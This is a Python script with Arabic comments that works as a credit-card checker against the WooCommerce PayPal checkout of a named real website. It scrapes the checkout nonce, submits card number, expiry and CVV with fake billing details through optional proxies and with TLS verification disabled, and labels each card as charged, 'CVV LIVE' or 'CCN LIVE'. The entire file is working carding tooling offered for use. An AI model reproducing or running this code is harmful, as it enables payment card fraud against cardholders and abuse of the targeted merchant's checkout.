"""
بوابة الدفع: PayPal Charge 2 (WooCommerce Checkout)
الموقع: hasene.org.uk
نوع البوابة: PayPal Charge (WooCommerce Checkout Flow)
تدفق الطلبات:
1. GET /checkout/ -> استخراج woocommerce-process-checkout-nonce
2. POST /?wc-ajax=checkout -> إرسال بيانات البطاقة وتصنيف النتيجة
"""
import aiohttp
import asyncio
import uuid
import ssl
import re


async def req1_get_checkout_nonce(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> str:
    """الخطوة 1: جلب woocommerce-process-checkout-nonce."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }
    try:
        async with session.get(
            "https://hasene.org.uk/checkout/",
            headers=headers,
            proxy=proxy_url,
        ) as r:
            text = await r.text()

        nonce_match = re.search(r'name="woocommerce-process-checkout-nonce" value="([^"]+)"', text)
        return nonce_match.group(1) if nonce_match else ""
    except Exception as e:
        raise RuntimeError(f"req1_get_checkout_nonce failed: {e}") from e


async def req2_submit_checkout(
    session: aiohttp.ClientSession,
    nonce: str,
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> dict:
    """الخطوة 2: إرسال طلب الدفع والحصول على الاستجابة."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://hasene.org.uk",
        "Referer": "https://hasene.org.uk/checkout/",
        "Connection": "keep-alive",
    }
    data = {
        "billing_first_name": "John",
        "billing_last_name": "Doe",
        "billing_company": "",
        "billing_country": "GB",
        "billing_address_1": "10 Downing Street",
        "billing_address_2": "",
        "billing_city": "London",
        "billing_state": "",
        "billing_postcode": "SW1A 2AA",
        "billing_phone": "07700900077",
        "billing_email": "johndoe@example.com",
        "payment_method": "paypal",
        "woocommerce-process-checkout-nonce": nonce,
        "_wp_http_referer": "/checkout/",
        "paypal_cc": cc,
        "paypal_exp_month": mes,
        "paypal_exp_year": ano,
        "paypal_cvv": cvv,
    }
    try:
        async with session.post(
            "https://hasene.org.uk/?wc-ajax=checkout",
            data=data,
            headers=headers,
            proxy=proxy_url,
        ) as r:
            try:
                return await r.json(content_type=None)
            except Exception:
                text = await r.text()
                return {"result": "failure", "messages": text}
    except Exception as e:
        raise RuntimeError(f"req2_submit_checkout failed: {e}") from e


async def process_paypal_2(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة PayPal Charge 2."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            nonce = await req1_get_checkout_nonce(session, proxy_url)
            resp_json = await req2_submit_checkout(session, nonce, cc, mes, ano, cvv, proxy_url)

    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    messages = str(resp_json.get("messages", "")).lower()
    result = str(resp_json.get("result", "")).lower()
    redirect = str(resp_json.get("redirect", "")).lower()

    if "success" in result or "order-received" in redirect:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Charged / Success"
    elif "insufficient funds" in messages:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Insufficient Funds"
    elif "incorrect zip" in messages or "zip check failed" in messages:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "CVV LIVE (Zip Failed)"
    elif "cvv" in messages or "security code" in messages:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "CCN LIVE (CVV Failed)"
    elif "do not honor" in messages:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Do Not Honor"
    elif "transaction has been declined" in messages:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Declined"
    else:
        if messages:
            clean_msg = re.sub(r"<[^>]+>", "", messages).strip()
            return f"❌ | {cc}|{mes}|{ano}|{cvv}", clean_msg if clean_msg else "Declined"
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Declined"
